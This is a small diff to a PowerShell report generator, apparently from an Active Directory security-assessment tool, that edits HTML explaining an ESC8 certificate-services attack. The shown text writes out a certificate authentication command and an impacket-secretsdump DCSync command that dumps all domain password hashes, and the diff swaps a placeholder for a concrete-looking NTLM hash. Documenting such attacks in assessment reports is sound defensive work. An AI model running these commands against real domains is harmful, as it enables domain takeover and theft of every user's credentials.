@@ -916,8 +916,7 @@ function Generate-PKIhtml {
                                                     <p class="code">python3 entry.py auth -pfx 'dc.pfx' -dc-ip 192.168.10.141</p>
                                                     <p> The ntlm hash can then be used to replicate the behavior of a domain
                                                         controller and obtain all the user password hashes within the domain via a DCSync.</p>
-                                                    <p class="code">impacket-secretsdump 'dc$'@192.168.10.141 -hashes
-                                                        :xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
+                                                    <p class="code">impacket-secretsdump 'dc$'@192.168.10.141 -hashes :1ee19a386bc9a3f08522b038e4ae0add</p>
                                                 </div>
                                                 <span class="image-cell">
                                                     <img src="/Private/Report/Images/PKI/ESC8-3.png"
